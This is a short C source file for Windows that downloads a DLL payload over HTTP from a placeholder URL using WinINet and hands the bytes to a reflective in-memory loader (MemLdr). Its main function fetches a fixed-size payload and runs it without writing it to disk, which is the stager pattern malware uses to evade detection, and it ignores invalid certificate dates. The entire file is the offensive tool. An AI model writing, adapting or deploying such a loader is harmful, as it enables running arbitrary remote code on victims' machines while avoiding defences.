//
// Created by scrub on 10/8/2024.
//

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include "../DllMemLdr.h"

#define url L"http://url.tofun/.dll"

BOOL HttpDownloadPayload(IN DWORD dwPayloadSize, OUT PVOID *pOutBuffer, OUT PDWORD dwBytesWritten) {
    HINTERNET hInternet = NULL;
    HINTERNET hInternetFile = NULL;
    PBYTE pBytes;
    DWORD dwBytesRead;

    hInternet = InternetOpenW(NULL, 0, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %lu \n", GetLastError());
        return FALSE;
    }

    // Opening a handle to the payload's URL
    hInternetFile = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %lu \n", GetLastError());
        return FALSE;
    }

    // Allocating a buffer for the payload
    pBytes = (PBYTE)LocalAlloc(LPTR, dwPayloadSize);

    // Reading the payload
    if (!InternetReadFile(hInternetFile, pBytes, dwPayloadSize, &dwBytesRead)) {
        printf("[!] InternetReadFile Failed With Error : %lu \n", GetLastError());
        return FALSE;
    }

    *pOutBuffer = pBytes;
    *dwBytesWritten = dwPayloadSize;

    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);


    return TRUE;
}

int main() {
    PVOID lpPayloadBuffer = NULL;
    DWORD dwPayloadSize = 328192;
    DWORD dwBytesWritten = 0;
    HttpDownloadPayload(dwPayloadSize, &lpPayloadBuffer, &dwBytesWritten);
    MemLdr(lpPayloadBuffer);
    getchar();
}